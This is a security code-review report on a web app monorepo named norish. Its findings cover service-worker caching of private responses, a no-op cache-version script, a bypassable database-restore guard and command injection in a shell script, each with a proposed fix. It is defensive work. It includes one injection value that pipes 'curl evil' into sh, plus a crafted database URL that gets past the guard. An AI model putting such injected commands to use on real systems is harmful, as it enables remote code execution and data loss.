## Method (so you can re-run / falsify every claim)

1. **Module reachability.** Wrote two crawlers (`/tmp/webgraph.mjs`, `/tmp/mobgraph.mjs`) that seed from real entry points — Next.js `page/layout/route/template/loading/error/manifest/sitemap` files + `server/**` + `scripts/**` + `proxy.ts` + `*.config.*` for web; every file under `src/app/**` (expo-router) for mobile — resolve `@/`, `@norish/web/`, `@/assets/` aliases and relative specifiers, and transitively mark reachable modules. Anything left over is an orphan candidate, then hand-verified with `git grep`.
2. **Package-internal graph.** `/tmp/graph.mjs` resolved every relative import inside `packages/{shared-react,i18n,config,ui}` and compared against the `exports` map entry points.
3. **Symbol reachability.** `/tmp/deadsym.mjs` extracted every `export function|const|let|class|type|interface|enum` and classified each hit as *own definition* / *barrel re-export* / *real use*, so factory-hooks consumed only by their own barrel-bundler are not falsely flagged.
4. **Dependency usage.** `/tmp/depcheck.mjs` matched every declared dep against every git-tracked source file in the owning package (including JSON/config), then each survivor was hand-checked against `app.json` plugin lists, `postcss.config`, `tsdown` externals, and CSS `@import`s.
5. **i18n.** `/tmp/i18ndead.mjs` + `/tmp/nsdead.mjs` — enumerated all 1152 `en` leaf keys, built the set of every quoted string literal in `apps/**` + `packages/**`, and matched each key against *every suffix* of its dotted path (so `useTranslations("settings.admin")` + `t("general.title")` scoping is handled). Then a namespace-level check against every `useTranslations("...")` scope literal.
6. **Typecheck honesty.** Ran each package's `typecheck` for real, then re-ran `apps/web` with the tsconfig flag overridden to prove what it hides.

### CR-02: Service worker caches authenticated, household-scoped responses with no purge on sign-out

**File:** `apps/web/public/sw.js:34-40, 47-50, 63-72, 79-90`
**Severity:** BLOCKER (violates the "per-cookbook isolation is security-critical" constraint at the client cache layer)

Two separate leaks:

1. **Recipe media is cached forever, unauthenticated.** Recipe images are served from `/recipes/{id}/{filename}` (`apps/web/app/(app)/recipes/[id]/[filename]/route.ts`), which is **not** under `/api/`, so it falls through to `request.destination === "image"` → `cacheFirst` (`sw.js:65-67`, strategy at `:71-80`). `cacheFirst` returns the cached body **without ever contacting the server**, so the server-side `requireRecipeMediaAccess` / `canAccessResource` check is bypassed for the lifetime of the cache. On a shared browser profile, user B sees user A's household recipe images.
2. **All GET `/api/**` responses are persisted.** `networkFirst` (`sw.js:82-93`) does `cache.put(req, fresh.clone())` for every GET with no status filter and no `Cache-Control`/`Vary`/auth check, then serves the cached copy on any network failure. 401/403/500 bodies are cached and replayed as if valid.

There is **no cache invalidation on sign-out** — verified: `git grep -n "caches.delete\|caches.keys" -- apps/web` returns only `sw.js:23,26` (the `activate` handler comparing cache *names*), and `apps/web/context/user-context.tsx:10` / `components/navbar/navbar-user-menu.tsx:253` call `signOut()` without touching CacheStorage.

**Fix:**
```js
// sw.js — do not cache private responses
async function networkFirst(req) {
  if (req.method !== "GET") return fetch(req);
  const fresh = await fetch(req).catch(() => null);
  if (fresh) {
    // only cache explicitly-public, successful responses
    if (fresh.ok && fresh.headers.get("cache-control")?.includes("public")) {
      (await caches.open(CACHE_NAME)).put(req, fresh.clone());
    }
    return fresh;
  }
  ...
}
// exclude /recipes/*/ media from cacheFirst, or move it to networkFirst
```
plus a `caches.keys().then(k => Promise.all(k.map(caches.delete)))` (or a `postMessage` to the SW) in the sign-out path.

**Note:** `sw.js` is upstream-owned (last touched by `bb003e9a RC v0.17.0`). The fix should be upstreamed rather than kept fork-local.

### CR-03: `update-sw-version.js` is a silent no-op — the SW cache name is frozen at `v0.3.0-beta`

**Files:** `apps/web/scripts/update-sw-version.js:18`, `apps/web/public/sw.js:1`
**Severity:** BLOCKER

```js
// scripts/update-sw-version.js:18
content = content.replace(/__CACHE_VERSION__/g, version);
```
```js
// public/sw.js:1
const CACHE_NAME = "norish-cache-v0.3.0-beta";
```

`__CACHE_VERSION__` **does not exist anywhere in the repo**:
```
$ grep -rn "__CACHE_VERSION__" apps/web
apps/web/scripts/update-sw-version.js:18   ← the replace call itself
(and its copy under .next/standalone)
```
So `pnpm update-sw` (wired into `apps/web` `build` at `package.json:8` and root `build:server`/`update-sw`) rewrites the file with identical content. `CACHE_NAME` is a hardcoded `v0.3.0-beta` while the app is at `0.19.0-beta`. Because `sw.js:21-31` only deletes caches whose *name* differs from `CACHE_NAME`, the precache **is never invalidated across releases** — returning users keep the `/`, `/manifest.webmanifest`, favicon and `_next` assets from whatever release first installed the SW.

**Fix:** either
```js
const CACHE_NAME = "norish-cache-v__CACHE_VERSION__";
```
(restoring the placeholder the script expects), or drop the script and derive the version at build time. Also note `turbo.json` declares `"update-sw": { "outputs": ["public/sw.js"] }` — a build step that mutates a **git-tracked source file** in place; once fixed it will dirty the working tree on every build. Prefer emitting to `.next/` or generating `sw.js` rather than patching it.

### CR-06: `clone-beta-db.sh`'s live-DB guard is bypassable — `pg_restore --clean` can drop the live schema

**File:** `tooling/beta/clone-beta-db.sh:51-67`
**Severity:** BLOCKER (data-loss risk)

The guard chain is:
```bash
if [[ "$BETA_DATABASE_URL" != *"norish-beta"* ]]; then ... exit 1; fi   # :51
if [[ "$BETA_DATABASE_URL" == *"@db:"* ]] || \                          # :61
   [[ "$BETA_DATABASE_URL" == *"@norish-db:"* ]] || \
   [[ "$BETA_DATABASE_URL" == *"@norish-db/"* ]]; then ... exit 1; fi
```
The first guard matches `norish-beta` **anywhere in the URL, including the password**. The second denylists only three literal host spellings. A URL like

```
postgres://postgres:norish-beta@192.168.2.11:5432/norish
```

(the live host by IP — and `norish-beta` really *is* the beta password used throughout `docker-compose.beta.yml:104`, so this is a plausible copy/paste) passes **both** guards and reaches `pg_restore --clean --if-exists -d "$BETA_DATABASE_URL"` at `:88-94`, which drops and recreates every object in the live database.

**Fix:** allowlist the *host* rather than substring-matching the whole URL:
```bash
host="$(printf '%s' "$BETA_DATABASE_URL" | sed -E 's#^[^@]*@([^:/?]+).*#\1#')"
case "$host" in
  norish-beta-db|localhost|127.0.0.1) ;;                 # + require port 5434 for local
  *) echo "ERROR: refusing to restore into host '$host'" >&2; exit 1 ;;
esac
```
and add a `--yes-i-mean-it` confirmation for any non-`norish-beta-db` host.

### WR-11: Command injection and swallowed exit codes in `antigravity-executor.sh`

**File:** `tooling/cross-ai/antigravity-executor.sh:46, 48`

```bash
INNER="$AGY -p \"\$(printf %s '$B64' | base64 -d)\" --dangerously-skip-permissions --model \"$MODEL\" $SANDBOX"
RAW="$(script -qec "$INNER" /dev/null 2>/dev/null || true)"
```
1. `$MODEL` (`NORISH_GEMINI_MODEL`), `$AGY` (`NORISH_AGY_BIN`) and `$SANDBOX` (`NORISH_AGY_SANDBOX`) are interpolated **unquoted/unescaped** into a string handed to `script -c`, which executes it via `sh -c`. `NORISH_GEMINI_MODEL='x"; curl evil|sh; #'` is arbitrary code execution. The prompt itself is correctly base64-armoured — the config vars are not. Threat model is limited (the operator sets these), but this is exactly the pattern to not have in a script that runs unattended from cron.
2. `|| true` on `:48` **discards the executor's exit status entirely**. `worker.sh`'s contract (`:7-8`) is "exit code is the executor's (0 = done, 75 = quota, other = failure)", and `run-or-defer.sh:61-86` routes on that code. As written, a hard `agy` failure that still printed *something* is filed as `done/` with a bogus SUMMARY. This directly undermines CLAUDE.md's "never trust the worker's self-reported Self-Check" — there isn't even a reliable failure signal to trust.

**Fix:** build an argv array and avoid the shell string —
```bash
RAW="$(script -qec "$(printf '%q ' "$AGY" -p "$PROMPT" --dangerously-skip-permissions --model "$MODEL" ${SANDBOX:+$SANDBOX})" /dev/null)"; rc=$?
```
and capture `rc` instead of `|| true`, propagating it after the quota check.
